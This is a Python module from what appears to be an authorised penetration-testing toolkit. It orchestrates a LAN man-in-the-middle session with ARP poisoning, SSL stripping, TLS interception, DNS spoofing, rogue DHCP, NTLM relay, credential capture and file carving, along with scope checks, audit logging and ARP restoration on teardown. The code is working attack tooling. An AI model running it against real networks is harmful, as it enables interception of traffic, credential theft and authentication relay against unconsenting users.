"""One armed engagement: every active module, started and stopped together.

Arming happens in an order chosen so that a failure half way through leaves
nothing dangerous behind, and disarming happens in the reverse order chosen
so the victims get their path back *first*:

    arm      forwarding -> proxies -> redirects -> poisoning
    disarm   poisoning (and ARP restore) -> redirects -> proxies -> forwarding

`disarm()` is idempotent and is wired to the stop path, the signal path and
process exit, because the failure that matters here is not a crash: it is a
crash that leaves a subnet pointed at a MAC address that stopped forwarding.
"""

from __future__ import annotations

import atexit
import logging
import os
import threading
import time

from netlab.intercept import netcfg
from netlab.intercept.arp import (ArpSocket, Poisoner, scan as arp_scan,
                                  resolve_many as arp_resolve_many)
from netlab.intercept.ca import CertificateAuthority
from netlab.intercept.dhcp import RogueDhcp
from netlab.intercept.dns import DnsSpoofer, SpoofRule
from netlab.intercept.promisc import PromiscScanner
from netlab.intercept.ntlm_relay import RelayServer
from netlab.intercept.proxy import (ChangerRule, InterceptContext,
                                    TransparentHttpProxy, TransparentTlsProxy)
from netlab.intercept.scope import AuditLog, Engagement, ScopeError

log = logging.getLogger("netlab.session")

DEFAULT_HTTP_PORT = 18080
DEFAULT_TLS_PORT = 18443
DEFAULT_DNS_PORT = 15353


class InterceptError(Exception):
    pass


DEFAULT_MODULES = {
    "arp_poison": True,
    "sslstrip": True,
    "ssl_mitm": False,
    "dns_spoof": False,
    "dhcp": False,
    "cookie_killer": False,
    "carve_files": False,
    "verify_upstream": False,
    "poison_interval": 2.0,
    "upstream_dns": "",
    "dhcp_lease": 600,
    "dhcp_pool_start": "",
    "dhcp_pool_end": "",
    "http_port": DEFAULT_HTTP_PORT,
    "tls_port": DEFAULT_TLS_PORT,
    "dns_port": DEFAULT_DNS_PORT,
    "ntlm_relay": False,
    "relay_target": "",
}


class InterceptSession:
    """The root-side object that owns every active module."""

    def __init__(self, engagement: Engagement, modules: dict | None = None,
                 ca_dir: str = "", owner_uid: int | None = None,
                 on_event=None) -> None:
        self.engagement = engagement
        self.modules = dict(DEFAULT_MODULES)
        self.modules.update(modules or {})
        self.on_event = on_event
        self.owner_uid = owner_uid

        self.audit = AuditLog(engagement.directory() / "audit.jsonl")
        self.ca = CertificateAuthority(ca_dir or
                                       (engagement.directory() / "ca"))

        self.iface: dict = {}
        self.kernel: netcfg.KernelState | None = None
        self.redirects: netcfg.RedirectRules | None = None
        self.poisoner: Poisoner | None = None
        self.dns: DnsSpoofer | None = None
        self.dhcp: RogueDhcp | None = None
        self.http_proxy: TransparentHttpProxy | None = None
        self.tls_proxy: TransparentTlsProxy | None = None
        self.relay: RelayServer | None = None
        self.ctx = InterceptContext(scope=engagement, audit=self.audit,
                                    on_event=self._event,
                                    on_credential=self._credential,
                                    on_exchange=self._exchange,
                                    on_file=self._file, ca=self.ca)

        self.armed = False
        self.armed_at = 0.0
        self.started_modules: list[str] = []
        self.targets: dict[str, str] = {}
        self.gateway_mac = ""
        self.credentials: list[dict] = []
        self.carved: list[dict] = []
        self._lock = threading.RLock()
        self._teardown_done = False
        self._cleanup_errors: list[str] = []
        atexit.register(self._emergency_restore)

    # -------------------------------------------------------------- events

    def _event(self, name: str, data: dict) -> None:
        if self.on_event:
            try:
                self.on_event(name, data)
            except Exception:                    # pragma: no cover
                log.debug("event sink failed", exc_info=True)

    def _credential(self, cred: dict) -> None:
        with self._lock:
            self.credentials.append(cred)
            if len(self.credentials) > 5000:
                del self.credentials[:1000]
        self._event("credential", cred)

    def _exchange(self, info: dict) -> None:
        self._event("http.exchange", info)

    def _file(self, info: dict) -> None:
        """Write a carved body under the engagement directory."""
        directory = self.engagement.directory() / "files"
        try:
            directory.mkdir(parents=True, exist_ok=True)
        except OSError:
            return
        from netlab.intercept.carve import save_carved
        record = save_carved(directory, info)
        if record is None:
            return
        if self.owner_uid is not None and os.geteuid() == 0:
            try:
                os.chown(record["path"], self.owner_uid, -1)
            except OSError:
                pass
        with self._lock:
            self.carved.append(record)
            if len(self.carved) > 4000:
                del self.carved[:500]
        self.audit.record("file.carved", url=record.get("url"),
                          path=record.get("path"), bytes=record.get("bytes"))
        self._event("file.carved", record)

    # ---------------------------------------------------------------- prep

    def prepare(self) -> dict:
        """Read the interface, find the gateway and resolve every MAC."""
        interface = self.engagement.interface
        self.iface = netcfg.interface_info(interface)
        if not self.iface.get("ipv4"):
            raise InterceptError("%s has no IPv4 address" % interface)
        if not self.iface.get("mac"):
            raise InterceptError("%s has no hardware address" % interface)

        gateway = self.engagement.gateway or netcfg.default_gateway(interface)
        if not gateway:
            raise InterceptError(
                "no gateway for %s; set one on the engagement" % interface)
        self.engagement.gateway = gateway

        cached = netcfg.arp_table()
        local_ip = self.iface["ipv4"]
        local_mac = self.iface["mac"]
        poisoning = bool(self.modules.get("arp_poison"))

        self.gateway_mac = cached.get(gateway)
        if not self.gateway_mac:
            with ArpSocket(interface, local_mac, local_ip) as sock:
                self.gateway_mac = sock.resolve(gateway)
        # The gateway's hardware address is what poisoning forges against.
        # Without poisoning we are in the path for another reason -- a route,
        # a rogue DHCP lease -- and not knowing it costs nothing.
        if not self.gateway_mac and poisoning:
            raise InterceptError(
                "the gateway %s did not answer ARP; it cannot be poisoned"
                % gateway)

        resolved: dict[str, str] = {}
        to_probe: list[str] = []
        for ip in self.engagement.hosts(limit=512):
            if ip in (local_ip, gateway):
                continue
            mac = cached.get(ip)
            if mac:
                resolved[ip] = mac
            elif poisoning:
                to_probe.append(ip)
        # One sweep for everything not already in the ARP cache, instead of a
        # blocking resolve per host: arming a wide scope is now seconds, not
        # minutes.
        if to_probe:
            resolved.update(arp_resolve_many(interface, local_mac, local_ip,
                                             to_probe, timeout=2.0))
        self.targets = resolved
        return {"interface": self.iface, "gateway": gateway,
                "gateway_mac": self.gateway_mac, "targets": resolved}

    # ----------------------------------------------------------------- arm

    def arm(self) -> dict:
        if self.armed:
            return self.status()
        if not self.engagement.authorised:
            raise ScopeError("the engagement has not been authorised")
        if os.geteuid() != 0:
            raise InterceptError(
                "active interception needs root; start the NetLab helper")

        self.engagement.save()
        self.audit.record("arm.begin", engagement=self.engagement.to_dict(),
                          modules=self.modules)
        prepared = self.prepare()
        if not self.targets and self.modules.get("arp_poison"):
            raise InterceptError(
                "no target in the engagement answered ARP; nothing to poison")

        interface = self.engagement.interface
        local_ip = self.iface["ipv4"]
        self.ctx.local_addresses = netcfg.local_addresses()
        self.ctx.cookie_killer = bool(self.modules.get("cookie_killer"))
        self.ctx.carve_files = bool(self.modules.get("carve_files"))
        self.ctx.sslstrip = bool(self.modules.get("sslstrip"))
        self.ctx.verify_upstream = bool(self.modules.get("verify_upstream"))
        self.ctx.set_rules([ChangerRule.from_dict(r)
                            for r in self.modules.get("changer_rules", [])])

        started: list[str] = []
        redirects: list[tuple[str, int, int]] = []
        try:
            # 1. Forwarding, or the poisoned traffic is simply dropped.
            self.kernel = netcfg.KernelState(interface)
            changed = self.kernel.enable_forwarding()
            self.audit.record("kernel.forwarding", changed=changed)
            started.append("ip_forward")

            # 2. Local services, before anything is pointed at them.
            if self.modules.get("sslstrip"):
                port = netcfg.free_port(int(self.modules["http_port"]))
                self.http_proxy = TransparentHttpProxy(self.ctx, port)
                redirects.append(("tcp", 80, self.http_proxy.start()))
                started.append("sslstrip")
            if self.modules.get("ssl_mitm"):
                self.ca.ensure(self.owner_uid)
                port = netcfg.free_port(int(self.modules["tls_port"]))
                self.tls_proxy = TransparentTlsProxy(self.ctx, port)
                redirects.append(("tcp", 443, self.tls_proxy.start()))
                started.append("ssl-mitm")
            if self.modules.get("dns_spoof"):
                upstream = self.modules.get("upstream_dns") or \
                    _system_resolver(exclude=local_ip)
                self.dns = DnsSpoofer(
                    netcfg.free_port(int(self.modules["dns_port"])),
                    upstream=upstream,
                    rules=[SpoofRule(r.get("pattern", "*"),
                                     r.get("address") or local_ip,
                                     r.get("enabled", True))
                           for r in self.modules.get("dns_rules", [])],
                    on_event=self._event, audit=self.audit,
                    scope=self.engagement)
                redirects.append(("udp", 53, self.dns.start()))
                started.append("dns-spoof")
            if self.modules.get("ntlm_relay"):
                relay_target = (self.modules.get("relay_target") or "").strip()
                if not relay_target:
                    raise InterceptError(
                        "NTLM relay needs a target server (relay_target)")
                # The relay authenticates the victim to this server, so the
                # server must be inside the engagement scope like any target.
                self.engagement.check(relay_target)
                self.relay = RelayServer(
                    target_host=relay_target, target_port=445,
                    listen_host="0.0.0.0",
                    listen_port=netcfg.free_port(14445),
                    scope=self.engagement, on_event=self._event,
                    audit=self.audit)
                redirects.append(("tcp", 445, self.relay.start()))
                started.append("ntlm-relay")

            # 3. Redirects, so the traffic we are about to steer has a target.
            if redirects:
                self.redirects = netcfg.RedirectRules(interface)
                installed = self.redirects.install(redirects)
                self.audit.record("nft.install", rules=installed)
                started.append("redirects")

            # 4. DHCP, which takes over new clients rather than existing ones.
            if self.modules.get("dhcp"):
                self.dhcp = RogueDhcp(
                    interface, local_ip, _netmask(self.iface["prefix"]),
                    pool_start=self.modules.get("dhcp_pool_start", ""),
                    pool_end=self.modules.get("dhcp_pool_end", ""),
                    router=local_ip, dns=[local_ip],
                    lease=int(self.modules.get("dhcp_lease", 600)),
                    scope=self.engagement, audit=self.audit,
                    on_event=self._event)
                self.dhcp.start()
                started.append("rogue-dhcp")

            # 5. Poisoning last: nothing is diverted until everything that
            #    has to catch it is already listening.
            if self.modules.get("arp_poison"):
                self.poisoner = Poisoner(
                    interface, self.iface["mac"], local_ip,
                    self.engagement.gateway, self.gateway_mac,
                    interval=float(self.modules.get("poison_interval", 2.0)),
                    audit=self.audit, on_event=self._event)
                for ip, mac in self.targets.items():
                    self.engagement.check(ip)
                    self.poisoner.add_target(ip, mac)
                self.poisoner.start()
                started.append("arp-poison")
        except Exception as exc:
            self.audit.record("arm.failed", error=str(exc))
            self._teardown()
            raise

        self.armed = True
        self.armed_at = time.time()
        self.started_modules = started
        self.audit.record("arm.complete", modules=started,
                          targets=list(self.targets),
                          gateway=self.engagement.gateway)
        self._event("armed", self.status())
        return self.status()

    # -------------------------------------------------------------- disarm

    def disarm(self) -> dict:
        if not self.armed and self._teardown_done:
            return self.status()
        self.audit.record("disarm.begin")
        report = self._teardown()
        self.armed = False
        self.audit.record("disarm.complete", **report)
        self._event("disarmed", report)
        return report

    def _teardown(self) -> dict:
        report = {"arp_restored": False, "redirects_removed": False,
                  "forwarding_restored": False, "errors": []}
        # Victims first: give the real path back before anything else.
        if self.poisoner is not None:
            try:
                self.poisoner.stop(restore=True)
                report["arp_restored"] = self.poisoner.restored
                if not report["arp_restored"]:
                    raise InterceptError("ARP restoration incomplete")
            except Exception as exc:
                report["errors"].append("arp: %s" % exc)
            else:
                self.poisoner = None
        if self.redirects is not None:
            try:
                report["redirects_removed"] = self.redirects.destroy()
                if not report["redirects_removed"]:
                    raise InterceptError("could not remove redirect rules")
            except Exception as exc:
                report["errors"].append("nft: %s" % exc)
            else:
                self.redirects = None
        for name in ("dhcp", "dns", "http_proxy", "tls_proxy", "relay"):
            module = getattr(self, name)
            if module is None:
                continue
            try:
                module.stop()
            except Exception as exc:
                report["errors"].append("%s: %s" % (name, exc))
            else:
                setattr(self, name, None)
        if self.kernel is not None:
            try:
                restored = self.kernel.restore()
                report["forwarding_restored"] = True
                report["sysctl"] = restored
            except Exception as exc:
                report["errors"].append("sysctl: %s" % exc)
            else:
                self.kernel = None
        self._teardown_done = not report["errors"]
        self._cleanup_errors = list(report["errors"])
        report["cleanup_pending"] = bool(self._cleanup_errors)
        self.started_modules = []
        return report

    def _emergency_restore(self) -> None:
        """Last line of defence, wired to process exit."""
        if self._teardown_done:
            return
        try:
            self._teardown()
        except Exception:                        # pragma: no cover
            pass

    # -------------------------------------------------------------- runtime

    def add_target(self, ip: str) -> dict:
        self.engagement.check(ip)
        mac = netcfg.arp_table().get(ip)
        if not mac:
            with ArpSocket(self.engagement.interface, self.iface["mac"],
                           self.iface["ipv4"]) as sock:
                mac = sock.resolve(ip)
        if not mac:
            raise InterceptError("%s did not answer ARP" % ip)
        self.targets[ip] = mac
        if self.poisoner:
            self.poisoner.add_target(ip, mac)
        return {"ip": ip, "mac": mac}

    def remove_target(self, ip: str) -> dict:
        self.targets.pop(ip, None)
        if self.poisoner:
            self.poisoner.remove_target(ip)
        return {"ip": ip}

    def set_changer_rules(self, rules) -> int:
        self.ctx.set_rules([ChangerRule.from_dict(r) for r in rules])
        self.modules["changer_rules"] = list(rules)
        self.audit.record("changer.rules", count=len(rules))
        return len(self.ctx.active_rules())

    def set_dns_rules(self, rules) -> int:
        local_ip = self.iface.get("ipv4", "")
        compiled = [SpoofRule(r.get("pattern", "*"),
                              r.get("address") or local_ip,
                              r.get("enabled", True)) for r in rules]
        if self.dns:
            self.dns.set_rules(compiled)
        self.modules["dns_rules"] = list(rules)
        self.audit.record("dns.rules", count=len(rules))
        return len(compiled)

    def scan(self, cidr: str = "", timeout: float = 3.0) -> list[dict]:
        iface = self.iface or netcfg.interface_info(self.engagement.interface)
        target = cidr or iface.get("cidr", "")
        if not target:
            raise InterceptError("no network to scan")
        hosts = arp_scan(self.engagement.interface, iface["mac"],
                         iface["ipv4"], target, timeout=timeout,
                         on_host=lambda h: self._event("scan.host", h))
        self.audit.record("arp.scan", cidr=target, found=len(hosts))
        return hosts

    def promisc_scan(self, targets=None) -> list[dict]:
        iface = self.iface or netcfg.interface_info(self.engagement.interface)
        scanner = PromiscScanner(self.engagement.interface, iface["mac"],
                                 iface["ipv4"], scope=self.engagement,
                                 audit=self.audit, on_event=self._event)
        return scanner.scan(list(targets or self.targets) or
                            self.engagement.hosts(limit=256))

    # --------------------------------------------------------------- status

    def status(self) -> dict:
        return {
            "armed": self.armed,
            "cleanup_pending": bool(self._cleanup_errors),
            "errors": list(self._cleanup_errors),
            "armed_at": self.armed_at,
            "uptime": (time.time() - self.armed_at) if self.armed else 0.0,
            "engagement": self.engagement.to_dict(),
            "modules": self.started_modules,
            "interface": self.iface,
            "gateway": self.engagement.gateway,
            "gateway_mac": self.gateway_mac,
            "targets": dict(self.targets),
            "poisoner": {
                "running": bool(self.poisoner and self.poisoner.running),
                "rounds": self.poisoner.rounds if self.poisoner else 0,
                "frames": self.poisoner.frames_sent if self.poisoner else 0,
                "restored": self.poisoner.restored if self.poisoner else False,
            },
            "proxy": self.ctx.stats.as_dict(),
            "stripped_hosts": self.ctx.stripped_hosts(),
            "dns": self.dns.stats() if self.dns else {},
            "dhcp": self.dhcp.stats() if self.dhcp else {},
            "redirects": self.redirects.rules if self.redirects else [],
            "ca": self.ca.info() if self.ca.exists else {},
            "credentials": len(self.credentials),
            "files": len(self.carved),
            "audit": {"path": str(self.audit.path), "entries": self.audit.count},
        }


def _netmask(prefix: int) -> str:
    bits = (0xFFFFFFFF << (32 - int(prefix or 24))) & 0xFFFFFFFF
    return "%d.%d.%d.%d" % ((bits >> 24) & 0xFF, (bits >> 16) & 0xFF,
                            (bits >> 8) & 0xFF, bits & 0xFF)


def _system_resolver(exclude: str = "") -> str:
    """The resolver this machine uses, so forwarded queries get real answers."""
    try:
        with open("/etc/resolv.conf", "r", encoding="utf-8") as fh:
            for line in fh:
                if line.startswith("nameserver"):
                    parts = line.split()
                    if len(parts) > 1 and parts[1] != exclude \
                            and not parts[1].startswith("127."):
                        return parts[1]
    except OSError:
        pass
    return "1.1.1.1"
